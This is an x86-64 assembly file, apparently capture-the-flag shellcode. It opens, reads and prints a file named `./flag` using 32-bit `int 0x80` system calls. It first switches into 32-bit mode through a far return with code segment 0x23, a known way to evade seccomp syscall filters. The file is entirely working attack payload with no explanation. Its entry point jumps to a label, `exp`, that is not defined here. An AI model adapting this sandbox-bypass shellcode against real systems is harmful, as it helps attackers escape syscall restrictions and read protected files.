    .intel_syntax noprefix
    .code64
    .text
    .globl _start, orw

_start:
    lea rsp, [buf + 0x200]
    jmp exp

orw:
    mov eax,offset orw2
    mov rbx,0x2300000000
    xor rax,rbx
    push rax
    retf

orw2:
    xor eax,eax
    mov al, 0x5
    lea ebx, [flag]
    xor ecx,ecx
    xor edx,edx
    int 0x80
    mov ebx,eax
    mov al, 3
    lea ecx,[buf]
    mov edx,0x50
    int 0x80
    mov al,4
    mov ebx, 1
    int 0x80

.align 8
buf: .space 0x200
flag: .asciz  "./flag"